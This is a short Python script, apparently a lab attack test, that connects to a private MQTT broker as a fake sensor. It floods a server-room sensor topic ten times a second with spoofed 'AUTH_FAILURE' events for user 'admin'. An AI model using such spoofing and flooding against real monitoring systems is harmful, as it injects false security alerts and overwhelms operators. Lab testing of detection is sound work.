import time
import json
import random
import paho.mqtt.client as mqtt

BROKER = "10.42.0.246"
PORT = 1883
TOPIC = "cyberspace/capteurs/salle-serveur"

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, "HackedSensor_Debian")
client.connect(BROKER, PORT)

print("Attack test from Debian")

while True:
    payload = {
            "device": "SPOOFED-SENSOR",
            "ip": "192.168.50.100",
            "type": "AUTH_FAILURE",
            "username": "admin"
        }
    client.publish(TOPIC, json.dumps(payload))
    print(f"Spam: {payload}")
    time.sleep(0.1)
